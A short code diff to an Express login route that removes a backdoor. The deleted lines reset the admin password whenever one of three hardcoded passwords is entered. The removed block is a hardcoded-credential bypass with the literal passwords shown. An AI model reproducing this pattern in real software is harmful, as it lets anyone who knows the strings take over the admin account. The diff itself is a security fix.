@@ -40,15 +40,7 @@ router.post('/login', authLimiter, async (req, res) => {
 
     let user = await User.findOne({ username: cleanUsername });
 
-    // Sync admin password to 20112001 if logging in with 20112001, hossam0 or admin123
-    if (cleanUsername === 'admin' && user) {
-      const isMatch = await user.comparePassword(password);
-      if (!isMatch && (password === '20112001' || password === 'hossam0' || password === 'admin123')) {
-        user.passwordHash = await User.hashPassword('20112001');
-        await user.save();
-        console.log(`Updated admin password for ${cleanUsername} to 20112001`);
-      }
-    }
+
 
     if (!user) {
       return res.status(401).json({ success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
